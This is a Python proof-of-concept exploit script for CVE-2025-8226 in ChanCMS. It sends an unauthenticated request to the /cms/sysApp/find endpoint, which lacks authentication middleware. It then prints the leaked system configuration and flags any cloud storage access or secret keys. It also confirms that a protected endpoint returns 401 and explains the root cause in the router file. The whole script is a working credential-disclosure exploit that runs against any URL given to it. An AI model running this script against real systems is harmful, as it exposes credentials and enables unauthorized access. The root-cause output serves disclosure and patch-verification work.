#!/usr/bin/env python3
import requests
import sys
import json

def exploit(target_url):
    print("=" * 70)
    print("CVE-2025-8226 - ChanCMS Information Disclosure")
    print("=" * 70)
    print()
    print(f"Target: {target_url}")
    print("Vulnerability: /cms/sysApp/find missing auth() middleware")
    print()

    vuln_url = f"{target_url.rstrip('/')}/cms/sysApp/find"
    protected_url = f"{target_url.rstrip('/')}/cms/sysApp/update"

    print("[*] Testing unauthenticated access to system config...")
    print("-" * 70)
    print(f"GET {vuln_url}")
    print()

    vulnerable = False

    try:
        response = requests.get(vuln_url, timeout=10)
        print(f"Status Code: {response.status_code}")

        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('code') == 200 and data.get('data'):
                    config_data = data.get('data', {})
                    config_key = config_data.get('config_key', '')
                    config_value = config_data.get('config_value', '')
                    type_code = config_data.get('type_code', '')
                    
                    print("[+] SUCCESS: Unauthenticated access to system config!")
                    print()
                    print("Leaked configuration:")
                    print(f"  Type: {type_code}")
                    print(f"  Key: {config_key}")
                    print(f"  Value: {config_value}")
                    
                    if 'accessKey' in config_key or 'secretKey' in config_key:
                        print()
                        print("[!] CRITICAL: Cloud storage credentials leaked!")
                    
                    vulnerable = True
            except json.JSONDecodeError:
                print(f"Response: {response.text[:200]}")

        print()
        print("[*] Verifying protected endpoint requires authentication...")
        print("-" * 70)
        print(f"POST {protected_url}")
        print()

        response2 = requests.post(protected_url, timeout=10)
        print(f"Status Code: {response2.status_code}")

        try:
            data2 = response2.json()
            if data2.get('code') == 401:
                print("[+] Protected endpoint correctly requires authentication")
                print(f"    Response: {data2.get('msg', '')}")
        except:
            print(f"Response: {response2.text[:100]}")

    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the target running?")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

    print()
    print("=" * 70)
    if vulnerable:
        print("RESULT: VULNERABLE")
        print()
        print("Root Cause Analysis:")
        print("  File: app/modules/cms/router.js line 19")
        print("  Code: router.get('/sysApp/find', controller.sysApp.find)")
        print("  Issue: Missing auth() middleware allows unauthenticated access")
        print()
        print("  Compare with protected endpoint (line 23):")
        print("  Code: router.post('/sysApp/update', auth(), controller.sysApp.update)")
    else:
        print("RESULT: NOT VULNERABLE or target not reachable")
    print("=" * 70)

    return vulnerable

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3100"
    result = exploit(target)
    sys.exit(0 if result else 1)
